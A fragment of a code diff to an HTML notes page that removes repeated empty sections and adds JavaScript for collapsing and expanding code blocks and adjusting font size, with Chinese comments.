     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
-    <pre class="code_1">
-
-    </pre>
-    <p>无总结</p>
-    
-    <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
-    <pre class="code_1">
-
-    </pre>
-    <p>无总结</p>
-    
-    <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
-    <pre class="code_1">
-
-    </pre>
-    <p>无总结</p>
-    
-    <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
-    <pre class="code_1">
-
-    </pre>
-    <p>无总结</p>
-    
-    <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
-    <pre class="code_1">
-
-    </pre>
-    <p>无总结</p>
-    
-    <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
@@ -1394,8 +1837,58 @@
   <!-- <script src="./js/rem.js"></script> -->
   <script>
     let frame = document.getElementById("frame");
+    let down = document.getElementsByClassName('down');
+    let code_1 = document.getElementsByClassName('code_1');
+
+    // 给所有code_1添加下标
+    for(let i=0; i<down.length; i++){
+      down[i].setAttribute("index",i);
+    }
+    //网页全部字体大小调整
     function trigger(value) {
       frame.style.fontSize = `${value}%`;
+    }
+    //单独下拉与收起
+    function clickondown(val) {
+      let classIndex = val.getAttribute("index"); // 当前操作的class下标
+
+      if (code_1[classIndex].style.display !== 'none' && code_1[classIndex].style.display !== 'block') {
+        code_1[classIndex].style.display = 'none';
+      }
+      if (code_1[classIndex].style.display == 'none'){
+        code_1[classIndex].style.display = 'block';
+        val.innerHTML = '/\\';
+      }
+      else{
+        code_1[classIndex].style.display = 'none';
+        val.innerHTML = '\\/';
+      }
+    }
+    //一键全部下拉与收起
+    function sqzk(val) {
+      if (val.innerHTML == "一键展开所有下拉栏↓") {
+        for(let i=0; i<down.length; i++){
+          code_1[i].style.display = 'block';
+          down[i].innerHTML = '/\\';
+        }
+        val.innerHTML = "一键收起所有下拉栏↑";
+        val.style.backgroundColor = '#00FFFF';
+        return;
+      }
+      if (val.innerHTML == "一键收起所有下拉栏↑") {
+        for(let i=0; i<down.length; i++){
+          code_1[i].style.display = 'none';
+          down[i].innerHTML = '\\/';
+        }
+        val.innerHTML = "一键展开所有下拉栏↓";
+        val.style.backgroundColor = '#e7e7e7';
+        return;
+      }
+    }
+    // 复制code_1内容
+    function name(params) {
+      console.log(code_1[0].innerHTML);
+      
     }
   </script>
 </body>
